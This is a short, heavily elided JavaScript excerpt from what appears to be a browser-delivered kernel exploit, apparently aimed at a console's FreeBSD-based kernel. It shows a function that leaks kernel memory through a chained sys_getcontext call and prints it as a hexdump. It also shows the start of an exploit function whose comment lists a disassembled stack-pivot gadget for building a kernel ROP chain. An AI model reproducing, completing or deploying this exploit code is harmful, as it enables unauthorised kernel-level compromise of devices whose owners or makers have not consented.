function getKernelBase_namedobj() {
	...
	stage1.fcall(window.syscalls[window.syscallnames['sys_getcontext']], leakData);
	stage1.run();
	
	alert(p.hexdump(leakData, 0x4C0)); // display
...
function kernExploit_namedobj() {
	try {
		...
		/*
		CODE:00000000000A826F                 mov     rsp, [rdi+0F8h] // rsp = kchainstack
		CODE:00000000000A8276                 mov     rcx, [rdi+0E0h] // rcx = NOP
		CODE:00000000000A827D                 push    rcx
		CODE:00000000000A827E                 mov     rcx, [rdi+60h] // rcx = 4
		CODE:00000000000A8282                 mov     rdi, [rdi+48h] // rdi = 0x1A4
		CODE:00000000000A8286                 retn
		*/
